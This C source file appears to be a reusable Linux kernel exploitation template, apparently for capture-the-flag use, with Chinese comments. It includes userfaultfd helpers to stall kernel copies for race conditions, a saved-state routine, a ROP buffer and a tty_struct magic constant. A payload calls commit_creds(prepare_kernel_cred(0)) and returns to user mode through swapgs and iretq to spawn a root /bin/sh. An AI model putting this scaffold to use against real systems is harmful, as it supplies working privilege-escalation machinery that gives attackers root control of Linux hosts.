#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

#include <sys/types.h>
#include <sys/ioctl.h>
#include <unistd.h> 
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#define TTY_STRUCT_MAGIC 0x0000000100005401

size_t canary;
size_t rop[0x30];
size_t commit_creds, prepare_kernel_cred, kernel_base;
size_t user_cs, user_ss, user_sp, user_rflags;

void logs(char *buf,char *tag){
    printf("[ s]: ");
    printf(" %s ",tag);
    printf(": %s\n",buf);
}
void logx(uint32_t num,char *tag){
    printf("[ x] ");
    printf(" %-20s ",tag);
    printf(": 0x%x\n",num);
}
void loglx(uint64_t num,char *tag){
    printf("[lx] ");
    printf(" %-20s ",tag);
    printf(": %-#16lx\n",num);
}
void logbuf(size_t *buf,int size){
    printf("logbuf: \n");
    for(int i=0;i<size;i+=2){
        printf("%-#16lx\t%-#16lx\n",buf[i],buf[i+1]);
    }
    printf("done!\n");
}
void pf_handler(long uffd){
    for(;;){
        struct pollfd pollfd[1]={0};
        pollfd[0].fd=uffd;
        pollfd[0].events=POLLIN;
        int pollres=poll(pollfd,1,0);
        switch (pollres)
        {
        case 0:continue;
            break;
        case 1:
            break;
        default:
            printf("err\n");
            exit(1);
            break;
        }
        struct  uffd_msg uffd_msg;
        read(uffd,&uffd_msg,sizeof(uffd_msg));
        long long addr=uffd_msg.arg.pagefault.address;
        
        struct uffdio_copy uffdio_copy;
        uffdio_copy.dst=addr&~(0x1000-1);
        uffdio_copy.len=0x1000;
        char buf[0x1000];
        uffdio_copy.src=&buf;
        uffdio_copy.mode=0;
        while(1)
            sleep(5);
        ioctl(uffd,UFFDIO_COPY,&uffdio_copy);
    }
}
void setpf(void *addr, unsigned len){
    /* 用法：setpf(一个mmap出来的地址，需要监控的长度)，记得需要fork一个子进程来搞，因为停在copy_from_user等函数时会让这个进程挂起*/
    /* 模板: mmap((void*)0x40000000,0x2000,PROT_EXEC|PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_FIXED|MAP_ANON,-1,0); */
    /* 同时设置下pf_hander 的最后一项，是否执行拷贝*/
    long uffd=syscall(SYS_userfaultfd,O_NONBLOCK|O_CLOEXEC); //打开系统调用
    //注册uffdio_api
    struct uffdio_api uffdio_api;
    uffdio_api.api=UFFD_API;
    uffdio_api.features=0;
    ioctl(uffd,UFFDIO_API,&uffdio_api);
    //注册地址范围
    struct uffdio_register uffdio_register;
    uffdio_register.range.start=addr;
    uffdio_register.range.len=len;
    uffdio_register.mode=UFFDIO_REGISTER_MODE_MISSING;
    ioctl(uffd,UFFDIO_REGISTER,&uffdio_register);
    //启动异常处理线程
    pthread_t pthr={0};
    pthread_create(&pthr,NULL,pf_handler,uffd);
}

void save_state()
{
    __asm__(
        "mov user_cs,cs;" 
        "mov user_sp,rsp;"
        "mov user_ss,ss;"
        "pushf;"           
        "pop user_rflags;" 
    );
}
void getshell()
{
    char *argv[] = {"/bin/sh",  NULL};
  	syscall(__NR_setuid, 0);
  	syscall(__NR_execve, "/bin/sh", argv, 0);
  	syscall(__NR_exit, 0);
}
__attribute__((naked)) void tramp(){
    __asm__(
        "mov rsp, 0x5001000;"
        "jmp getshell;"
    );
}
void *SHELL=tramp;
void sudo()
{
    void *(*pre)(int) = prepare_kernel_cred; 
    int (*cc)(void *) = commit_creds;
    (*cc)((*pre)(0));
    __asm__(
        "push user_ss;"
        "push user_sp;"
        "push user_rflags;"
        "push user_cs;"
        "push SHELL;"
        "push 0;"
        "swapgs;"
        "pop rbp;"
        "iretq;"
    );
}


int main()
{
    mmap((void*)0x5000000,0x2000,PROT_EXEC|PROT_READ|PROT_WRITE,MAP_PRIVATE |MAP_ANON|MAP_FIXED | MAP_POPULATE , 0 , 0 );
    signal(SIGSEGV,SHELL);    
    save_state();
    

    return 0;
}
